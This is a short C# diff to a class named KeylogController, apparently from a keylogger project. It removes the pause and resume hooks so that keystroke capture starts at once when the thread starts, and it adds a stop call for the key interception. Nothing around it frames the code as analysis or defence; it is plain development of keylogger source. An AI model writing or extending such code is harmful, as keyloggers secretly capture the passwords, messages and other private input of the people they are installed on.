@@ -4,49 +4,31 @@ class KeylogController
 {
     private Thread worker;
     private CancellationTokenSource cts;
-    private ManualResetEvent pauseEvent = new ManualResetEvent(false);
 
     public void Start()
     {
         cts = new CancellationTokenSource();
-
         worker = new Thread(() => Run(cts.Token));
-        worker.IsBackground = true;
-        worker.Start();
 
-        Console.WriteLine("Keylogger thread created (paused)");
+        worker.Start();
+        File.WriteAllText(appstart.path, "");
     }
 
     private void Run(CancellationToken token)
     {
-        while (!token.IsCancellationRequested)
-        {
-            // Wait until HOOK (resume)
-            pauseEvent.WaitOne();
-
-            // Call your keylogger logic
-            KeyLogger.InterceptKeys.startKLog();
-        }
-    }
-
-    public void Hook()
-    {
-        Console.WriteLine("HOOK");
-        File.WriteAllText(appstart.path, "");
-        pauseEvent.Set(); // resume
-    }
-
-    public void Unhook()
-    {
-        Console.WriteLine("UNHOOK");
-        pauseEvent.Reset(); // pause
+        KeyLogger.InterceptKeys.startKLog();
     }
 
     public void Stop()
     {
         Console.WriteLine("STOP");
+        KeyLogger.InterceptKeys.stopKLog();
         cts.Cancel();
-        pauseEvent.Set();
+
+        if (worker != null && worker.IsAlive)
+        {
+            worker.Join(1000); // Wait up to 1 second
+        }
     }
 
     public string PrintKeys()
